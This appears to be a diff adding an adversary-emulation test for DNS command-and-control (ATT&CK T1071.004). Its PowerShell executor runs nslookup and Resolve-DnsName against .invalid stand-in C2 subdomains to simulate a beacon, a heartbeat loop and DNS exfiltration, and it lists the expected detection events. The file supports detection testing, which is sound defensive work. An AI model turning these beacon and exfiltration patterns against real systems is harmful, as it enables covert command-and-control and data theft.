@@ -1,0 +1,47 @@
+id: T1071.004
+name: Application Layer Protocol — DNS
+description: Simulates DNS C2 tunneling and beacon patterns — executes nslookup against a .invalid TLD C2 subdomain (EID 4688 + Sysmon EID 22), loops through 5 distinct C2 subdomains using Resolve-DnsName to mimic DNS C2 heartbeat (multiple Sysmon EID 22 events), and simulates DNS exfiltration with a crafted subdomain. Attackers use DNS C2 to blend with legitimate DNS traffic and bypass HTTP-focused proxies. Multiple short-interval DNS queries to subdomains of a single domain is a high-confidence DNS C2 detection pattern. All queries target .invalid TLD — no real C2 infrastructure contacted.
+tactic: command-and-control
+technique_id: T1071.004
+platform: windows
+phase: attack
+elevation_required: false
+expected_events:
+  - "Sysmon 22 (DNSEvent — DNS query to C2 subdomain for DNS tunneling simulation)"
+  - "4688 (nslookup.exe — DNS C2 lookup for beacon subdomain lognojutsu-c2.invalid)"
+  - "4104 (PowerShell ScriptBlock — Resolve-DnsName C2 DNS queries)"
+tags:
+  - command-and-control
+  - no-prereqs
+executor:
+  type: powershell
+  command: |-
+    Write-Host "[T1071.004] Application Layer Protocol: DNS — DNS C2 simulation"
+
+    # Method 1: nslookup classic DNS lookup (EID 4688 for nslookup.exe + Sysmon EID 22)
+    Write-Host "--- Method 1: nslookup DNS C2 beacon (EID 4688 + Sysmon EID 22) ---"
+    nslookup beacon.lognojutsu-c2.invalid 2>&1 | Write-Host
+
+    # Method 2: DNS tunneling simulation — loop through distinct C2 subdomains (multiple Sysmon EID 22)
+    Write-Host "--- Method 2: DNS C2 heartbeat loop — 5 subdomain queries (Sysmon EID 22) ---"
+    $queryCount = 0
+    1..5 | ForEach-Object {
+        $subdomain = "c2-$_.lognojutsu-c2.invalid"
+        Write-Host "DNS query: $subdomain"
+        Resolve-DnsName $subdomain -ErrorAction SilentlyContinue | Out-Null
+        $queryCount++
+        Start-Sleep -Milliseconds 500
+    }
+    Write-Host "DNS heartbeat loop complete: $queryCount queries sent"
+
+    # Method 3: DNS exfiltration simulation — crafted subdomain encodes data (EID 4104 + Sysmon EID 22)
+    Write-Host "--- Method 3: DNS exfil simulation — crafted subdomain (EID 4104 + Sysmon EID 22) ---"
+    Resolve-DnsName "exfil-data.lognojutsu-c2.invalid" -ErrorAction SilentlyContinue | Out-Null
+    Write-Host "DNS exfil subdomain queried — Sysmon EID 22 generated."
+
+    # Method 4: Output total DNS query count
+    $totalQueries = 1 + $queryCount + 1
+    Write-Host "--- DNS C2 summary: $totalQueries total queries sent ---"
+
+    Write-Host "[T1071.004] Complete. Sysmon EID 22 + EID 4688 + EID 4104 generated."
+cleanup: ""
